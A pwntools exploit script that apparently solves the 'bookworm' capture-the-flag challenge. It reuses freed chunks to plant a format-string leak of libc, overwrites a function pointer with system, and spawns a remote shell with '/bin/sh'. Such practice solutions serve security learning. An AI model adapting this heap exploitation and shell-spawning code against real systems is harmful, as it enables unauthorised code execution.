#!/usr/bin/env python

from pwn import *

BINARY = './bookworm'
LIBC = './libc.so.6'
HOST = 'cha.hackpack.club'
PORT = 41720

elf = ELF(BINARY)

context.terminal = ['tmux', 'split-w']


def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
	script = ""
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process([BINARY], env={"LD_PRELOAD":LIBC})
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def create(size, name, summary_size, summary):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("size: ", size)
    p.sendlineafter("name: ", name)
    p.sendlineafter("summary size: ", summary_size)
    p.sendlineafter("summary: ", summary)


def delete(index):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("(0-10): ", index)
    
def read(index):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("(0-10): ", index)

def edit(index, size, summary):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("(0-10): ", index)
    p.sendlineafter("size: ", size)
    p.sendlineafter("summary: ", summary)

def leak(index):
    p.sendlineafter(">> ", "4")
    p.sendline(index)
    leak = int(p.recvuntil("\n")[23:-1], 16)
    libc = leak - 0x21b97
    log.info("Libc base: {}".format(hex(libc)))
    return libc
    


p = start()
if args.GDB:
    gdb.attach(p, 'b system')

#for i in range(0,8):
#    create("20", str(i)*8, "20", str(i)*8)

exit = p64(0x0400780)
exit_ptr = p64(0x00602060)
display = p64(0x004008d8)
printf = p64(0x00400720)

# %15p libc
# %10p stack leak


create("520", "B", "520", "%15$p")
delete("0")
create("20", printf, "20", "A"*10)

libc_base = leak("0")
system = libc_base + 0x4f440
log.info("System address: {}".format(hex(system)))


create("520", "B", "520", "/bin/sh")
delete("2")
create("20", p64(system), "20", "A"*10)
read("2")

p.interactive()
